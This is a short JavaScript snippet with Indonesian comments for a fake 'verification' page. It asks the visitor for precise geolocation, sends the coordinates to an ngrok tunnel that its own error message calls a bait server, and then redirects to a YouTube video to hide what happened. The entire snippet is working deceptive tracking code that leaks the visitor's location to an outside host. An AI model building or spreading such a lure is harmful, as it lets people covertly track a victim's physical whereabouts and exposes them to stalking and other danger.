<script>
    function gasVerif() {
        const msg = document.getElementById('status-msg');
        const youtubeID = "EFmxPMdBqmU"; 
        
        // GANTI INI DENGAN LINK NGROK TERBARU KAMU!
        const linkNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev"; 

        msg.style.display = "block";
        msg.className = '';
        msg.innerText = "Memproses verifikasi...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // 1. KIRIM DATA DULU
                fetch(`${linkNgrok}/api/kirim-lokasi?lat=${lat}&lon=${lon}`, {
                    mode: 'cors'
                })
                .then(() => {
                    // 2. JIKA BERHASIL TERKIRIM, BARU BUKA YOUTUBE
                    msg.className = 'success';
                    msg.innerText = "✅ Berhasil! Membuka YouTube...";
                    
                    setTimeout(() => {
                        window.location.href = `https://www.youtube.com/watch?v=${youtubeID}`;
                    }, 1000);
                })
                .catch(err => {
                    // Jika Ngrok mati/salah link
                    msg.className = 'error';
                    msg.innerText = "❌ Gagal koneksi ke server pancingan.";
                    console.error(err);
                });

            }, (err) => {
                msg.className = 'error';
                msg.innerText = "❌ Error: Kamu harus klik 'Izinkan' untuk lanjut.";
            }, { enableHighAccuracy: true, timeout: 5000 });
        } else {
            msg.innerText = "Browser tidak mendukung lokasi.";
        }
    }
</script>
